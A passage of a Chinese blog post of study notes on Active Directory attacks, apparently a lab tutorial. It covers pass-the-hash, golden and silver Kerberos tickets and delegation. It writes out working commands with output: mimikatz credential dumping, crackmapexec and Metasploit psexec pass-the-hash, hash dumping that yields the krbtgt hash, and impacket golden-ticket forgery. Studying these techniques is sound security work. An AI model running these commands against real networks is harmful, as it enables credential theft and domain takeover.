+<p>（默认情况下）由于UAC机制的存在，PTH的攻击对象只能是<strong>本地账户的administrator账户</strong> 和 <strong>域账户</strong>。<strong>本地普通账户和本地管理员组中的非administrator账户</strong> 均不可以。（不同版本的windows可能会有所区别，详细见书301页）</p>
+</li>
+</ul>
+<p>​		UAC的机制：见书297页。</p>
+<h3 id="实施-1">
+<a class="header-anchor" href="#%e5%ae%9e%e6%96%bd-1"></a>
+实施
+</h3><p>实施步骤：</p>
+<p>1.获取hash</p>
+<p>2.实施哈希传递攻击</p>
+<h4 id="获取hash只能获取已经登陆用户的hash">
+<a class="header-anchor" href="#%e8%8e%b7%e5%8f%96hash%e5%8f%aa%e8%83%bd%e8%8e%b7%e5%8f%96%e5%b7%b2%e7%bb%8f%e7%99%bb%e9%99%86%e7%94%a8%e6%88%b7%e7%9a%84hash"></a>
+获取hash（只能获取已经登陆用户的hash）
+</h4><p>本质是抓取内存中的hash。</p>
+<p>需要管理员权限。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">使用mimikatz获取本地hash，需将工具上传至本地并执行，实际场景下还涉及到免杀。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">.\mimikatz.exe &#34;privilege::debug&#34; &#34;sekurlsa::logonpasswords full&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">c7418a726d8b057f8b88f5540e1a1f25
+</span></span><span class="line"><span class="cl">a4ef9e354320a1e304e5dd68fe3b1a2f
+</span></span><span class="line"><span class="cl">8d45ed7943afd7431f4dd1287e1cbacf779050d6
+</span></span></code></pre></div><!-- raw HTML omitted -->
+<h4 id="实施哈希传递攻击">
+<a class="header-anchor" href="#%e5%ae%9e%e6%96%bd%e5%93%88%e5%b8%8c%e4%bc%a0%e9%80%92%e6%94%bb%e5%87%bb"></a>
+实施哈希传递攻击
+</h4><ul>
+<li>crackmapexec</li>
+</ul>
+<p>​</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ crackmapexec smb  192.168.1.200 -u administrator -H a4ef9e354320a1e304e5dd68fe3b1a2f                                         
+</span></span><span class="line"><span class="cl">SMB         192.168.1.200   <span class="m">445</span>    WIN-N4EHVKA9FGJ  <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2008</span> R2 Datacenter <span class="m">7601</span> Service Pack <span class="m">1</span> x64 <span class="o">(</span>name:WIN-N4EHVKA9FGJ<span class="o">)</span> <span class="o">(</span>domain:xie.com<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         192.168.1.200   <span class="m">445</span>    WIN-N4EHVKA9FGJ  <span class="o">[</span>+<span class="o">]</span> xie.com<span class="se">\a</span>dministrator:a4ef9e354320a1e304e5dd68fe3b1a2f <span class="o">(</span>Pwn3d!<span class="o">)</span> <span class="c1">##成功</span>
+</span></span></code></pre></div><ul>
+<li>MSF中的smb/psexec模块 实现横向移动。（使用mimikatz、impacket等工具也可以进行横向移动）</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-SHELL" data-lang="SHELL"><span class="line"><span class="cl">use exploit/windows/smb/psexec
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> smbuser administrator
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> smbpass aad3b435b51404eeaad3b435b51404ee:78756282d1fcb13c8f94a368ab24235c <span class="c1">## LM-HASH:NTLM-HASH</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> smbdomain XX.COM
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> rhosts 172.16.X.X
+</span></span><span class="line"><span class="cl">exploit
+</span></span></code></pre></div><h2 id="0x06-票据传递攻击">
+<a class="header-anchor" href="#0x06-%e7%a5%a8%e6%8d%ae%e4%bc%a0%e9%80%92%e6%94%bb%e5%87%bb"></a>
+0x06 票据传递攻击
+</h2><h3 id="一黄金票据传递攻击">
+<a class="header-anchor" href="#%e4%b8%80%e9%bb%84%e9%87%91%e7%a5%a8%e6%8d%ae%e4%bc%a0%e9%80%92%e6%94%bb%e5%87%bb"></a>
+一、黄金票据传递攻击
+</h3><h4 id="原理-5">
+<a class="header-anchor" href="#%e5%8e%9f%e7%90%86-5"></a>
+原理
+</h4><p>产生于kerberos认证的AS-REP阶段。</p>
+<p>该攻击的本质是伪造AS-REP包，包中存在TGT的加密部分内容，加密全部使用krbtgt账户的ntlm-hash。</p>
+<p>因此获取krbtgt账户的ntlm-hash，即可伪造黄金票据，进行攻击。</p>
+<h4 id="注意">
+<a class="header-anchor" href="#%e6%b3%a8%e6%84%8f"></a>
+注意
+</h4><ul>
+<li>获取krbtgt的ntlm-hash的前提是拿下域控管理员权限才行。</li>
+<li>只适用于后渗透权限维持。</li>
+</ul>
+<h4 id="伪造黄金票据的需求">
+<a class="header-anchor" href="#%e4%bc%aa%e9%80%a0%e9%bb%84%e9%87%91%e7%a5%a8%e6%8d%ae%e7%9a%84%e9%9c%80%e6%b1%82"></a>
+伪造黄金票据的需求
+</h4><ul>
+<li>krbtgt账户的ntlm-hash。MSF的meterpeter 中运行 run windows/gather/smart_hashdump</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">meterpreter <span class="p">&gt;</span> run windows/gather/smart_hashdump
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Running module against WIN-N4EHVKA9FGJ
+</span></span><span class="line"><span class="cl">[*] Hashes will be saved to the database if one is connected.
+</span></span><span class="line"><span class="cl">[+] Hashes will be saved in loot in JtR password file format to:
+</span></span><span class="line"><span class="cl">[*] /home/kali/.msf4/loot/20240206012358_default_192.168.1.200_windows.hashes_084970.txt
+</span></span><span class="line"><span class="cl">[+] Host is a Domain Controller
+</span></span><span class="line"><span class="cl">[*] Dumping password hashes...
+</span></span><span class="line"><span class="cl">[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:a4ef9e354320a1e304e5dd68fe3b1a2f
+</span></span><span class="line"><span class="cl">[+]     krbtgt:502:aad3b435b51404eeaad3b435b51404ee:02bbb271d87ce9fd0d6547f431a16666 
+</span></span><span class="line"><span class="cl">[+]     AD-kong:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4
+</span></span><span class="line"><span class="cl">[+]     WIN-N4EHVKA9FGJ$:1001:aad3b435b51404eeaad3b435b51404ee:d64dc48790526c89e3929025f72ed9ce
+</span></span><span class="line"><span class="cl">————————————————————————————————————————————————————————————————————————————
+</span></span><span class="line"><span class="cl">用这个 02bbb271d87ce9fd0d6547f431a16666
+</span></span></code></pre></div><ul>
+<li>域的SID值。使用 wmic useraccount get name,sid 查询。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">C<span class="p">:</span><span class="nl">\Windows\system32</span><span class="c1">&gt;wmic useraccount get name,sid</span>
+</span></span><span class="line"><span class="cl">wmic useraccount get name,sid
+</span></span><span class="line"><span class="cl">Name           SID                                        
+</span></span><span class="line"><span class="cl">Administrator  S-1-5-21-99781-1873236282-2985923340-500    
+</span></span><span class="line"><span class="cl">Guest          S-1-5-21-99781-1873236282-2985923340-501   
+</span></span><span class="line"><span class="cl">krbtgt         S-1-5-21-99781-1873236282-2985923340-502   
+</span></span><span class="line"><span class="cl">AD-kong        S-1-5-21-99781-1873236282-2985923340-1000 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">————————————————————————————————————————————————————————————
+</span></span><span class="line"><span class="cl">用这个 S-1-5-21-99781-1873236282-2985923340
+</span></span></code></pre></div><ul>
+<li>域名。使用ipconfig/all 查询。</li>
+</ul>
+<p><img src="./../../images/image-20240206142621387.png" alt="image-20240206142621387"></p>
+<ul>
+<li>要伪造的账户，一般写高权限账户。如，administrator。</li>
+</ul>
+<h4 id="利用过程">
+<a class="header-anchor" href="#%e5%88%a9%e7%94%a8%e8%bf%87%e7%a8%8b"></a>
+利用过程
+</h4><ul>
+<li>使用impacket</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-zsh" data-lang="zsh"><span class="line"><span class="cl">1.生成黄金票据
+</span></span><span class="line"><span class="cl">python3 ticketer.py -nthash 02bbb271d87ce9fd0d6547f431a16666 -domain-sid S-1-5-21-99781-1873236282-2985923340 -domain xie.com administrator
+</span></span><span class="line"><span class="cl">---------------------------------------------------
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ python /usr/share/doc/python3-impacket/examples/ticketer.py -nthash 02bbb271d87ce9fd0d6547f431a16666 -domain-sid S-1-5-21-99781-1873236282-2985923340 -domain xie.com administrator
+</span></span><span class="line"><span class="cl">Impacket v0.11.0 - Copyright <span class="m">2023</span> Fortra
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Creating basic skeleton ticket and PAC Infos
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Customizing ticket <span class="k">for</span> xie.com/administrator
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     PAC_LOGON_INFO
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     PAC_CLIENT_INFO_TYPE
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     EncTicketPart
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     EncAsRepPart
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Signing/Encrypting final ticket
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     PAC_SERVER_CHECKSUM
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     PAC_PRIVSVR_CHECKSUM
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     EncTicketPart
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     EncASRepPart
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in administrator.ccache
+</span></span><span class="line"><span class="cl">-----------------------------------------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2.导入票据
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache
+</span></span><span class="line"><span class="cl">3.导出用户administrator的hash
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">。。。。后面没成功，以后再复现吧。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">python3 psexec.py -k -n fsec.cn/test1@2008-1 cmd
+</span></span></code></pre></div><h3 id="二白银票据传递攻击">
+<a class="header-anchor" href="#%e4%ba%8c%e7%99%bd%e9%93%b6%e7%a5%a8%e6%8d%ae%e4%bc%a0%e9%80%92%e6%94%bb%e5%87%bb"></a>
+二、白银票据传递攻击
+</h3><h4 id="原理-6">
+<a class="header-anchor" href="#%e5%8e%9f%e7%90%86-6"></a>
+原理
+</h4><p>产生于kerberos认证的TGS-REP阶段。</p>
+<p>该攻击的本质是伪造TGS-REP包，包中存在ST的加密部分内容，加密全部使用该<strong>服务账户</strong>的ntlm-hash。</p>
+<p>因此获取<strong>服务账户</strong>的ntlm-hash，即可伪造白银票据，进行攻击。</p>
+<h4 id="注意-1">
+<a class="header-anchor" href="#%e6%b3%a8%e6%84%8f-1"></a>
+注意
+</h4><ul>
+<li>获取服务账户的ntlm-hash的前提是拿下域控管理员权限才行。</li>
+<li>只适用于后渗透权限维持。</li>
+</ul>
+<h4 id="伪造白银票据需要">
+<a class="header-anchor" href="#%e4%bc%aa%e9%80%a0%e7%99%bd%e9%93%b6%e7%a5%a8%e6%8d%ae%e9%9c%80%e8%a6%81"></a>
+伪造白银票据需要
+</h4><ul>
+<li>服务账户的ntlm-hash</li>
+<li>域的SID值</li>
+<li>域名</li>
+<li>伪造的域用户</li>
+</ul>
+<p>&hellip;&hellip;.没写</p>
+<h3 id="三黄金和白银票据的区别">
+<a class="header-anchor" href="#%e4%b8%89%e9%bb%84%e9%87%91%e5%92%8c%e7%99%bd%e9%93%b6%e7%a5%a8%e6%8d%ae%e7%9a%84%e5%8c%ba%e5%88%ab"></a>
+三、黄金和白银票据的区别
+</h3><ul>
+<li>黄金票据：伪造TGT，可以用高权限访问任意服务。</li>
+</ul>
+<p>​			使用krbtgt账户的ntml-hash 加密。</p>
+<p>​			还需要与KDC的TGS通信，获得ST，因此会在域控中留下日志。</p>
+<ul>
+<li>白银票据：伪造ST，可以用高权限访问指定的服务。</li>
+</ul>
+<p>​			使用指定服务的账户的ntml-hash 加密。</p>
+<p>​			无需与KDC通信，只会在目标服务器留下日志。</p>
+<h2 id="0x07-委派攻击">
+<a class="header-anchor" href="#0x07-%e5%a7%94%e6%b4%be%e6%94%bb%e5%87%bb"></a>
+0x07 委派攻击
+</h2><h3 id="简介">
+<a class="header-anchor" href="#%e7%ae%80%e4%bb%8b"></a>
+简介
+</h3><p>目的是为了提供更加便利的域内身份认证。</p>
+<p>委派指：将域用户的权限委派给服务账户，让服务账户以域用户的权限去访问其他域内的服务。</p>
+<p>只有服务账户才具备委派属性。</p>
+</div>
+    <footer class="article-footer"><ul class="article-category-list"><li class="article-tag-list-item" data-aos="zoom-in">
+    <a
+      class="article-category-link"
+      href="/categories/ad%e5%9f%9f-%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86"
+      data-aos="zoom-in"
+      >AD域-基础知识</a
+    >
+    </li></ul>
+<ul class="article-tag-list" itemprop="keywords"></ul>
+</footer>
+  </div><nav
+    id="article-nav"
+    aria-label="Article navigation"
+    data-aos="fade-up"
+  ><div class="article-nav-link-wrap right"><img
+              data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
+              data-sizes="auto"
+              alt=""
+              class="lazyload"
+            /><a
+          href="/post/images/0x08-/"
+          aria-label="后一篇:(no title)"
+          title="后一篇:(no title)"
+        ></a>
+        <div class="article-nav-caption">后一篇</div>
+        <h3 class="article-nav-title">(no title)</h3>
+      </div></nav></article></section>
+        </div><footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info"><div>
+      <span class="icon-copyright"></span>2020-2026<span class="footer-info-sep rotate"></span>L
+    </div><div>
+        基于&nbsp;<a
+          href="https://gohugo.io/"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Hugo</a
+        >&nbsp;Theme.<a
+          href="https://github.com/D-Sketon/hugo-theme-reimu"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Reimu</a
+        >
+      </div><div>
+        <span class="icon-brush"
+          >&nbsp;73.0k</span
+        >
+        &nbsp;|&nbsp;
+        <span class="icon-coffee">&nbsp;03:05</span>
+      </div><div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv"
+          >总访问量&nbsp;<span
+            id="busuanzi_value_site_pv"
+          ></span
+        ></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv"
+          >总访客量&nbsp;<span
+            id="busuanzi_value_site_uv"
+          ></span
+        ></span>
+      </div></div>
+</footer>
+<div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div><div id="mask" class="hide"></div>
+      </div><nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x01--域内用户枚举">0x01  域内用户枚举</a>
+      <ul>
+        <li><a href="#原理">原理</a></li>
+        <li><a href="#工具">工具</a></li>
+        <li><a href="#总结">总结</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x02-密码喷洒">0x02 密码喷洒</a>
+      <ul>
+        <li><a href="#原理-1">原理</a></li>
+        <li><a href="#工具-1">工具</a></li>
+        <li><a href="#总结-1">总结</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x03-as-rep-roasting">0x03 AS-REP Roasting</a>
+      <ul>
+        <li><a href="#原理-2">原理</a></li>
+        <li><a href="#前提">前提</a></li>
+        <li><a href="#实施">实施</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x04-kerberoasting">0x04 kerberoasting</a>
+      <ul>
+        <li><a href="#原理-3">原理</a></li>
+        <li><a href="#前提-1">前提</a></li>
+        <li><a href="#攻击流程">攻击流程</a></li>
+        <li><a href="#实施-见书234页懒得写">实施 (见书234页，懒得写)</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x05-哈希传递pth">0x05 哈希传递(PTH)</a>
+      <ul>
+        <li><a href="#原理-4">原理</a></li>
+        <li><a href="#局限">局限</a></li>
+        <li><a href="#实施-1">实施</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x06-票据传递攻击">0x06 票据传递攻击</a>
+      <ul>
+        <li><a href="#一黄金票据传递攻击">一、黄金票据传递攻击</a></li>
+        <li><a href="#二白银票据传递攻击">二、白银票据传递攻击</a></li>
+        <li><a href="#三黄金和白银票据的区别">三、黄金和白银票据的区别</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x07-委派攻击">0x07 委派攻击</a>
+      <ul>
+        <li><a href="#简介">简介</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="L"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">L</div>
+  <div class="sidebar-description">少女祈祷中...</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">74</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      15
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">20</div>
+  </a>
+</div>
+<div class="sidebar-social" ></div><div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">友链</div>
+    </div></div></div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
+</div><script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    
+    
+    
+    
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    
+    
+    
+    
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js"  ></script><script src="/js/aos.js"  ></script><script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script><script src="/js/pjax_main.js" data-pjax ></script><script>
+  var setupFirework = () => {
+    if (! false  || !window.matchMedia('(max-width: 768px)').matches) {
+      if (window.firework) {
+        const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"var(--red-1)\",\"var(--red-2)\",\"var(--red-3)\",\"var(--red-4)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
+        options.excludeElements = options.excludeelements;
+        delete options.excludeelements;
+        window.firework(options);
+      }
+    }
+  }
+</script><script
+    src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js"
+    defer
+    
+    
+    onload="setupFirework()"
+    integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8&#43;pUoWX8n1rgq282T" crossorigin="anonymous"></script>
+
+<div id="lazy-script">
+  <div><script data-pjax>
+        window.REIMU_POST = {
+          author: "L",
+          title: "域渗透-攻击手段",
+          url: "http:\/\/localhost:1313\/post\/ad%E5%9F%9F\/%E5%9F%9F%E6%B8%97%E9%80%8F-%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5\/",
+          description: "\r0x01 域内用户枚举\r原理\r根据kerberos协议中的AS-REQ阶段，不同用户状态（禁用、启用、不存在）时的不同响应实现枚举。\n工具\rkerbrute\n地址：https:\/\/github.com\/ropnop\/kerbrute\/releases\/tag\/v1.0.3 使用： .\\kerbrute_windows_amd64.exe userenum --dc 192.168.1.200 -d xie.com user.txt ## user.txt 是字典，需要自己指定. ## --dc 指域控的IP ## xie.com 指域名 pykerbrute\n",
+          cover: "http:\/\/localhost:1313\/images\/banner.webp",
+        };
+      </script><script src="/js/insert_highlight.js" data-pjax ></script><script src="/js/tabs.js" data-pjax defer></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+        }
+        pswp()
+      </script></div>
+</div><script
+    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
+    
+    async
+    
+    
+    integrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        for (let registration of registrations) {
+          registration.unregister();
+        }
+      });
+    }
+  </script><script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script></body>
+</html>
